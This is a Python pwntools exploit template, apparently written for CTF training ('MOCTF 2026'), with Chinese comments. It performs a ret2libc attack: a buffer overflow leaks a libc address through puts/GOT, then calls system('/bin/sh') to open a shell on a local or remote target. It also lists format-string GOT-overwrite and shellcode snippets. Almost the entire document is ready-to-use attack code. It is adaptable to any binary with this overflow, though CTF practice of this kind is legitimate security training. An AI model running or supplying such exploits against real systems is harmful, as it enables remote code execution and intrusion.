#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通用 Pwn 攻擊腳本範本（MOCTF 2026 訓練用）。

支持：本地/遠端切換、Send-after提示、leak libc、ret2libc、gdb attach。
使用：python3 exploit.py            # 本地
     python3 exploit.py REMOTE      # 遠端（IP/PORT 自行改）
     python3 exploit.py GDB         # 附加 gdb（調試用）
"""

from pwn import *
import sys
import os

# ========================= 環境設定 =========================
context.arch = 'amd64'          # 'amd64' | 'i386' | 'mips' | 'mipsel' | 'arm'
context.log_level = 'info'      # info | debug | warn
context.terminal = ['tmux', 'splitw', '-h']   # gdb.attach 需要

# ---------- 賽場資訊（根據題目修改這三組） ----------
CHALLENGE = './challenge'        # 題目二進制
LIBC      = './libc.so.6'        # 附件 libc（若無請註解並調整下面）
HOST, PORT = 'challenge.moctf.com', 9000
OFFSET    = 72                   # ret 到 buffer 的偏移 (cyclic 定位)

# ---------- Gadget 位址（ROPgadget 定位） ----------
POP_RDI = 0x4012ab               # `pop rdi ; ret`
RET_GAD = 0x40101a               # 對齊用 ret

elf = ELF(CHALLENGE, checksec=False)
if os.path.exists(LIBC):
    libc = ELF(LIBC, checksec=False)
else:
    libc = elf.libc              # 本地 libc

def start():
    """本地 / 遠端 / gdb 三合一"""
    if 'GDB' in sys.argv:
        return gdb.debug(CHALLENGE, gdbscript='b vuln')
    if 'REMOTE' in sys.argv:
        return remote(HOST, PORT)
    return process(CHALLENGE)

io = start()

# ========================= 第一階段：leak libc =========================
leak_payload = flat(
    b'A' * OFFSET,
    POP_RDI,
    elf.got['puts'],        # puts 的 GOT 地址
    elf.plt['puts'],        # call puts(got_puts) → 洩露位址
    elf.symbols['main'],    # 回到 main，準備第二輪
)

io.sendlineafter(b'Name: ', leak_payload)
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))   # 6 bytes 位址 + padding

if libc:
    libc.address = leaked - libc.symbols['puts']
    log.success('libc base  = %#x' % libc.address)
    log.success('puts       = %#x' % leaked)
    log.success('system     = %#x' % libc.symbols['system'])
    log.success('/bin/sh    = %#x' % next(libc.search(b'/bin/sh')))
else:
    log.warn('沒有 libc 附件，需手動算 offset')

# ========================= 第二階段：ret2libc =========================
if libc:
    final_payload = flat(
        b'A' * OFFSET,
        POP_RDI,
        next(libc.search(b'/bin/sh')),
        RET_GAD,                    # 對齊（若 sys 崩，開/關此）
        libc.symbols['system'],
    )
    io.sendlineafter(b'Name: ', final_payload)
    io.sendline(bytes('echo shell-ok'.encode('utf-8')))
    io.interactive()
else:
    io.interactive()

# ========================= 常用小工具 =========================
# fmtstr_payload(6, { elf.got['printf']: libc.symbols['system'] })       # 格式化字串寫 GOT
# shellcode = asm(shellcraft.sh())                                        # 64-bit /bin/sh
# log.critical(...)  /  log.failure(...)   /  log.warning(...)            # 各級 log
